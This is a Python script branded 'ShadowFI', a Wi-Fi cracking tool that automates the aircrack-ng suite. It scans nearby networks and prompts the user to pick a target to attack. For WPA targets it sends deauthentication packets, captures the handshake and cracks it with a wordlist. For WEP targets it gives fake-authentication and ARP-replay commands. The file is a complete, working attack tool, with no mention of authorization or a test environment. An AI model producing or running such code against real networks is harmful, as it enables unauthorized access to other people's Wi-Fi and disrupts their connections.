#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import time
import signal
import re
from threading import Thread
from termcolor import colored

# --- Configuration ---


WORDLIST_PATH = os.path.expanduser("~/share/wordlists/rockyou.txt")
CAPTURE_FILE_PREFIX = "capture"

# --- Global State ---
original_interface = None
monitor_interface = None
airodump_process = None
cleanup_done = False

# --- UI Elements ---
def print_banner():
    """Prints the ASCII art banner."""
    banner = """
⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷  ⠀
⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
 ‌ShadowFI A Wi-Fi cracking tool -ByAres
"""
    animated_print(colored(banner, 'red', attrs=['bold']))

def animated_print(text):
    """Prints text with a typewriter animation."""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.005)
    print()

def print_info(message):
    """Prints an informational message."""
    print(colored(f"[+] {message}", 'cyan'))

def print_success(message):
    """Prints a success message."""
    print(colored(f"[✔] {message}", 'green', attrs=['bold']))

def print_warning(message):
    """Prints a warning message."""
    print(colored(f"[!] {message}", 'yellow'))

def print_error(message):
    """Prints an error message and exits."""
    print(colored(f"[✘] {message}", 'red', attrs=['bold']))
    sys.exit(1)

def print_progress_bar(iteration, total, prefix='', suffix='', length=50, fill='█'):
    """Creates and prints a terminal progress bar."""
    percent = ("{0:.1f}").format(100 * (iteration / float(total)))
    filled_length = int(length * iteration // total)
    bar = fill * filled_length + '-' * (length - filled_length)
    sys.stdout.write(colored(f'\r{prefix} |{bar}| {percent}% {suffix}', 'magenta'))
    sys.stdout.flush()

# --- Core Functions ---
def check_root():
    """Checks if the script is run as root."""
    if os.geteuid() != 0:
        print_error("This script must be run as root. Please use 'sudo'.")

def cleanup(signum=None, frame=None):
    """Restores network interface and services to their original state."""
    global cleanup_done, airodump_process
    if cleanup_done:
        return
    
    print("\n")
    print_info("Cleaning up and restoring settings...")

    if airodump_process and airodump_process.poll() is None:
        try:
            airodump_process.terminate()
            airodump_process.wait(timeout=5)
            print_info("Stopped airodump-ng process.")
        except Exception as e:
            print_warning(f"Could not terminate airodump-ng gracefully: {e}")

    if monitor_interface:
        try:
            subprocess.run(['airmon-ng', 'stop', monitor_interface], check=True, capture_output=True, text=True)
            print_success(f"Monitor mode disabled on {monitor_interface}.")
        except subprocess.CalledProcessError as e:
            print_warning(f"Failed to stop monitor mode: {e.stderr.strip()}")

    try:
        # A more robust way to restart NetworkManager
        subprocess.run(['systemctl', 'start', 'NetworkManager.service'], check=True, capture_output=True, text=True)
        print_success("NetworkManager service started.")
    except subprocess.CalledProcessError as e:
        print_warning(f"Could not start NetworkManager: {e.stderr.strip()}")

    # Remove temporary files
    for f in os.listdir('.'):
        if f.startswith(CAPTURE_FILE_PREFIX):
            os.remove(f)
            print_info(f"Removed temporary file: {f}")
            
    cleanup_done = True
    print_success("Cleanup complete. Exiting.")
    sys.exit(0)

def setup_monitor_mode():
    """Puts the wireless card into monitor mode."""
    global original_interface, monitor_interface

    # Find a suitable wireless interface
    try:
        iwconfig_output = subprocess.check_output(['iwconfig']).decode('utf-8')
        interfaces = re.findall(r'^([a-zA-Z0-9]+)\s+IEEE 802.11', iwconfig_output, re.MULTILINE)
        if not interfaces:
            print_error("No wireless interfaces found.")
            
        # Let user choose interface if more than one
        if len(interfaces) > 1:
            print_info("Multiple wireless interfaces found:")
            for i, iface in enumerate(interfaces):
                print(f"  {i+1}) {iface}")
            choice = int(input("Choose the interface to use: ")) - 1
            original_interface = interfaces[choice]
        else:
            original_interface = interfaces[0]
            
        print_success(f"Selected interface: {original_interface}")

    except (FileNotFoundError, subprocess.CalledProcessError):
        print_error("`iwconfig` command not found. Please ensure wireless tools are installed.")
    
    # Kill interfering processes
    print_info("Terminating processes that could interfere...")
    try:
        subprocess.run(['airmon-ng', 'check', 'kill'], check=True, capture_output=True, text=True)
    except subprocess.CalledProcessError as e:
        print_warning(f"airmon-ng check kill failed, but continuing: {e.stderr.strip()}")

    # Start monitor mode
    print_info(f"Starting monitor mode on {original_interface}...")
    try:
        start_output = subprocess.check_output(['airmon-ng', 'start', original_interface]).decode('utf-8')
        monitor_match = re.search(r'monitor mode enabled on (\w+)', start_output)
        if monitor_match:
            monitor_interface = monitor_match.group(1).strip()
        else: # Fallback for different airmon-ng versions
            monitor_interface_output = subprocess.check_output(['iwconfig']).decode('utf-8')
            monitor_found = re.search(r'^([a-zA-Z0-9]+mon)\s+', monitor_interface_output, re.MULTILINE)
            if monitor_found:
                monitor_interface = monitor_found.group(1)
            else:
                monitor_interface = original_interface + "mon" # Common naming scheme

        print_success(f"Monitor mode enabled on {monitor_interface}.")
    except subprocess.CalledProcessError as e:
        print_error(f"Failed to start monitor mode: {e.stderr.strip()}")
        cleanup()


def scan_networks():
    """Scans for nearby Wi-Fi networks."""
    global airodump_process
    print_info(f"Scanning for networks... Press Ctrl+C to stop.")
    
    scan_file = f"{CAPTURE_FILE_PREFIX}-scan"
    
    # Command to scan for networks and write to a CSV file
    cmd = ['airodump-ng', '--output-format', 'csv', '--write', scan_file, monitor_interface]
    
    try:
        # Run airodump-ng for a limited time (e.g., 20 seconds, to ensure enough time for CSV write)
        # Using a higher timeout to ensure airodump-ng has enough time to write
        # Also, redirect stdout/stderr to files instead of DEVNULL to aid debugging if needed
        airodump_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Animate scanning
        # Increased scan time to 20 seconds for better results
        for i in range(20): 
            sys.stdout.write(colored(f"\rScanning... [{'=' * (i // 2)}>{' ' * (9 - (i // 2))}] {i*100/20:.0f}%", 'cyan'))
            sys.stdout.flush()
            time.sleep(1)
        
        airodump_process.terminate()
        airodump_process.wait()
        print("\n")
        print_success("Scan complete.")

        # Read the CSV file
        csv_path = f"{scan_file}-01.csv"
        if not os.path.exists(csv_path):
            print_error(f"Scan failed. No output file found at {csv_path}.")
            return []

        networks = []
        with open(csv_path, 'r', errors='ignore') as f:
            content = f.read()

        # Split content into APs and clients section
        # The 'Station MAC' line marks the start of the client section.
        # Everything before it should be Access Point data.
        ap_section, _, _ = content.partition('Station MAC,') 
        # Note: 'Station MAC,' instead of 'Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs'
        # The exact header might vary, so using a partial match for robustness.

        for line in ap_section.splitlines():
            # Skip empty lines or header lines within the AP section
            if not line.strip() or line.startswith('BSSID,'):
                continue

            fields = line.split(',')
            # A typical AP entry in airodump-ng CSV has at least 14 fields for:
            # BSSID (0), FTS (1), LTS (2), Channel (3), Speed (4), Privacy (5),
            # Cipher (6), Authentication (7), Power (8), #beacons (9), #IV (10),
            # LAN IP (11), ID-length (12), ESSID (13)
            if len(fields) < 14:
                continue

            bssid = fields[0].strip()
            encryption = fields[5].strip() # Privacy field (index 5)
            essid = fields[13].strip() # ESSID field (index 13)

            # Ignore hidden networks or those with null/length-0 ESSID
            # These often start with '\x00' or '<length:'
            if essid and not essid.startswith('\\x00') and not essid.startswith('<length:'):
                networks.append({
                    "bssid": bssid,
                    "essid": essid,
                    "encryption": encryption,
                })
        return networks

    except FileNotFoundError:
        print_error("airodump-ng not found. Is aircrack-ng suite installed and in your PATH?")
        cleanup()
    except Exception as e:
        print_error(f"An error occurred during scanning: {e}")
        cleanup()
        return []

def select_target(networks):
    """Displays networks and prompts user to select a target."""
    if not networks:
        print_warning("No networks found. Try scanning again.")
        return None

    print_info("Networks Found:")
    print(colored("="*60, "yellow"))
    print(colored(f"{'No.':<5} {'SSID':<30} {'Encryption':<15}", 'yellow', attrs=['bold']))
    print(colored("="*60, "yellow"))

    for i, net in enumerate(networks):
        color = 'green' if 'WPA' in net['encryption'] else 'red' if 'WEP' in net['encryption'] else 'cyan'
        print(colored(f"{i+1:<5} {net['essid']:<30} {net['encryption']:<15}", color))

    print(colored("="*60, "yellow"))

    while True:
        try:
            choice = input("Select a target number to attack (or 'q' to quit): ")
            if choice.lower() == 'q':
                return None
            choice_num = int(choice)
            print(f"DEBUG: User entered number: {choice_num}") # Debug print
            if 1 <= choice_num <= len(networks):
                selected_network = networks[choice_num - 1]
                print(f"DEBUG: Attempting to select index: {choice_num - 1}") # Debug print
                print(f"DEBUG: Selected network (from list): SSID='{selected_network['essid']}', BSSID='{selected_network['bssid']}'") # Debug print
                return selected_network
            else:
                print_warning("Invalid number. Please try again.")
        except ValueError:
            print_warning("Invalid input. Please enter a number.")

def attack_wpa(target):
    """Performs a WPA/WPA2 deauth and handshake capture attack."""
    global airodump_process
    print_info(f"Targeting SSID: {target['essid']} ({target['bssid']})")
    print_info("Starting handshake capture... This may take a few minutes.")

    # Get channel of the target AP
    channel = None
    try:
        # Re-read the scan file to get the channel reliably
        dump_file = f"{CAPTURE_FILE_PREFIX}-scan-01.csv"
        with open(dump_file, 'r', errors='ignore') as f:
            for line in f:
                if line.startswith(target['bssid']): # Match line by BSSID
                    fields = line.split(',')
                    if len(fields) > 3: # Channel is usually the 4th field (index 3)
                        channel = fields[3].strip()
                        break
            else: # If loop completes without break, BSSID not found
                print_error("Could not determine target channel from scan file.")
                return
    except Exception as e:
        print_error(f"Error reading scan file for channel: {e}")
        return

    if channel is None:
        print_error("Could not determine target channel. Please ensure the target BSSID is present in the scan results.")
        return


    print_info(f"Target is on channel {channel}.")
    capture_file = f"{CAPTURE_FILE_PREFIX}-{target['essid']}"
    
    # Start airodump-ng to capture the handshake
    airodump_cmd = [
        'airodump-ng',
        '--bssid', target['bssid'],
        '--channel', channel,
        '--write', capture_file,
        monitor_interface
    ]
    airodump_process = subprocess.Popen(airodump_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

    # Deauth thread
    deauth_thread = Thread(target=send_deauth, args=(target['bssid'],), daemon=True)
    deauth_thread.start()

    print_info("Waiting for WPA Handshake... (Check top right of airodump-ng window)")
    
    handshake_captured = False
    try:
        for line in iter(airodump_process.stdout.readline, ''):
            sys.stdout.write(colored(line, 'grey')) # Display airodump output
            if "WPA handshake:" in line:
                print_success("\nHandshake captured!")
                handshake_captured = True
                break
    except KeyboardInterrupt:
        print_warning("\nHandshake capture interrupted by user.")
    finally:
        airodump_process.terminate()
        airodump_process.wait()

    if not handshake_captured:
        print_error("Failed to capture handshake. Target may be out of range or have no active clients.")
        return

    # Crack the handshake
    if not os.path.exists(WORDLIST_PATH):
        print_error(f"Wordlist not found at {WORDLIST_PATH}. Cannot proceed with cracking.")
        return

    print_info(f"Attempting to crack handshake using {WORDLIST_PATH}...")
    print_info("Cracking process will run with lower CPU/disk priority and limited cores to reduce system load.")
    handshake_file = f"{capture_file}-01.cap"
    
    # Ensure the .cap file exists before attempting to crack
    if not os.path.exists(handshake_file):
        print_error(f"Handshake capture file not found: {handshake_file}. Cracking cannot proceed.")
        return

    crack_cmd = [
        'nice', '-n', '10',         # Set CPU priority to a lower level (niceness 10)
        'ionice', '-c', '2', '-n', '7', # Set I/O priority to best-effort, low (class 2, niceness 7)
        'aircrack-ng',
        '-j', '2',                  # Use only 2 CPU cores for cracking to reduce load
        '-w', WORDLIST_PATH,
        '-b', target['bssid'],
        handshake_file
    ]
    
    try:
        # aircrack-ng is interactive, so we need to process its output in real-time
        process = subprocess.Popen(crack_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        password_found = False
        for line in iter(process.stdout.readline, ''):
            sys.stdout.write(line)
            if "KEY FOUND!" in line:
                password = re.search(r'\[\s*(.*)\s*\]', line)
                if password:
                    print_success("\n" + "="*20)
                    print_success(f"  PASSWORD FOUND: {password.group(1)}")
                    print_success("="*20 + "\n")
                    password_found = True
                    break
        
        process.wait()
        
        if not password_found:
            print_warning("Password not found in the wordlist.")

    except FileNotFoundError:
        print_error("aircrack-ng or nice/ionice not found. Are they installed and in your PATH?")
    except Exception as e:
        print_error(f"An error occurred during cracking: {e}")

def send_deauth(bssid):
    """Sends deauthentication packets to force a client reconnect."""
    time.sleep(10) # Wait for airodump to start properly
    print_info("Sending deauthentication packets to trigger a new handshake...")
    deauth_cmd = [
        'aireplay-ng',
        '--deauth', '15', # Send 15 bursts of deauth packets
        '-a', bssid,
        monitor_interface
    ]
    try:
        subprocess.run(deauth_cmd, check=True, capture_output=True, text=True)
        print_success("Deauthentication packets sent.")
    except subprocess.CalledProcessError as e:
        # This often fails if no clients are connected, which is fine.
        print_warning(f"Deauthentication command finished with status: {e.stderr.strip()}")

def attack_wep(target):
    """Guides user through a WEP attack (not fully automated due to complexity)."""
    print_info("WEP attack is a multi-stage process.")
    print_info("The script will start capturing packets. You need to generate traffic.")
    print_info(f"In a NEW terminal, run the following command to perform a fake authentication:")
    print(colored(f"  sudo aireplay-ng -1 0 -a {target['bssid']} {monitor_interface}", "green"))
    print_info(f"Then, run this command to start an ARP-replay attack to generate IVs:")
    print(colored(f"  sudo aireplay-ng -3 -b {target['bssid']} {monitor_interface}", "green"))
    
    input(colored("Press [Enter] after starting the attacks in other terminals to continue...", "yellow"))
    
    capture_file = f"{CAPTURE_FILE_PREFIX}-{target['essid']}"
    airodump_cmd = [
        'airodump-ng',
        '--bssid', target['bssid'],
        '--ivs', # Save only IVs for WEP cracking
        '--write', capture_file,
        monitor_interface
    ]
    
    print_info("Starting packet capture. Watch the '#Data' column in the window.")
    print_info("Once you have 20,000+ data packets, press Ctrl+C here to stop capturing.")
    
    try:
        subprocess.run(airodump_cmd)
    except KeyboardInterrupt:
        print_success("\nCapture stopped.")

    ivs_file = f"{capture_file}-01.ivs"
    if not os.path.exists(ivs_file):
        print_error("Capture file not found. Attack failed.")
        return

    print_info("Attempting to crack WEP key...")
    crack_cmd = ['aircrack-ng', ivs_file]
    try:
        subprocess.run(crack_cmd)
    except Exception as e:
        print_error(f"Error during WEP cracking: {e}")

# --- Main Execution ---
def main():
    """Main function to orchestrate the tool's workflow."""
    signal.signal(signal.SIGINT, cleanup)
    
    print_banner()
    check_root()

    try:
        setup_monitor_mode()
        networks = scan_networks()
        target = select_target(networks)

        if target:
            if target['encryption'] == 'OPN':
                print_success("Target network is Open. No cracking needed.")
            elif 'WPA' in target['encryption']:
                attack_wpa(target)
            elif 'WEP' in target['encryption']:
                attack_wep(target)
            else:
                print_warning(f"Unsupported encryption type: {target['encryption']}")
    
    except Exception as e:
        print_error(f"An unexpected error occurred: {e}")
    
    finally:
        # Final cleanup call to ensure everything is restored
        cleanup()

if __name__ == "__main__":
    main()

